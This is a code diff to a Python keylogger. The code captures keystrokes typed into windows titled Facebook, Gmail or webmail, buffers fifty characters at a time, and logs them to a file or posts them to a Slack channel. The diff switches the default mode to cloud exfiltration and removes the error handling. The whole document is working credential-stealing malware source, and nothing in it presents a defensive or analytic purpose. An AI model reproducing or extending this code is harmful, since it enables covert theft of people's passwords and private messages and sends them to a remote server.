@@ -6,7 +6,7 @@ import configparser
 import time
 from datetime import datetime
 from slackclient import SlackClient
-from winreg import *
+# from winreg import *
 
 #########################################
 #		INITIALIZATION VARIABLES		#
@@ -20,11 +20,16 @@ slack_token = config['token']['tk1']
 slack_client = SlackClient(slack_token)
 # File info
 FILE = 'logfile.log'
-data = ''
-max_length = 1
+DATA = ''
+DATA_LENGTH = 50
 
 # Keywords for algorithm
 key_words = ['FACEBOOK', 'GMAIL', 'WEBMAIL']
+
+# Log configuration
+# mode 0: log on local file
+# mode 1: log on slack server
+MODE = 1
 
 
 #################################
@@ -38,40 +43,39 @@ def startup(func):
 	"""
 
 def on_keyboard(event):
-	global data
-	try:
-		if is_relevant_window(event.WindowName, key_words):
-			if event.Ascii == 13: # return pressed
-				key_pressed = '\n'
-			elif event.Ascii == 9: # tab pressed
-				key_pressed = '\t'
-			elif event.Ascii == 8:
-				key_pressed = '[BACK]'
-			else:
-				# convert pressed key using Ascii look up table
-				key_pressed = chr(event.Ascii)
-			data += key_pressed
-			if len(data) >= max_length:
-				log_info = {'datum': datetime.now().__str__(), 'WindowName': event.WindowName,
-						'data': data}
-				log = "{d[datum]} :: {d[WindowName]} :: {d[data]} \n".format(d=log_info)
-				data = ''
+	global DATA
+	if is_relevant_window(event.WindowName, key_words):
+		if event.Ascii == 13: # return pressed
+			key_pressed = '[RETURN]'
+		elif event.Ascii == 9: # tab pressed
+			key_pressed = '[TAB]'
+		elif event.Ascii == 8:
+			key_pressed = '[BACK]'
+		else:
+			# convert pressed key using Ascii look up table
+			key_pressed = chr(event.Ascii)
+		DATA += key_pressed
+		if len(DATA) >= DATA_LENGTH:
+			log_info = {'datum': datetime.now().__str__(), 'WindowName': event.WindowName,
+						'DATA': DATA}
+			log = "{d[datum]} :: {d[WindowName]} :: {d[DATA]} \n".format(d=log_info)
+			if MODE == 0:
 				log_on_file(FILE, log)
-				#log_on_cloud(slack_client, slack_channel, log)
-		return True
-	except:
-		return False
+			elif MODE == 1:
+				log_on_cloud(slack_client, slack_channel, log)
+			DATA = ''
+	return True
 
-def log_on_file(file, data):
-	# append the input data in the log file
+def log_on_file(file, DATA):
+	# append the input DATA in the log file
 	with open(file, 'a') as f:
-		f.write(data)
+		f.write(DATA)
 
-def log_on_cloud(client, channel, data):
+def log_on_cloud(client, channel, DATA):
 	client.api_call(
 		"chat.postMessage",
 		channel=channel,
-		text=data)
+		text=DATA)
 
 #################################
 #		ALGORITHM RELEVANT  	#
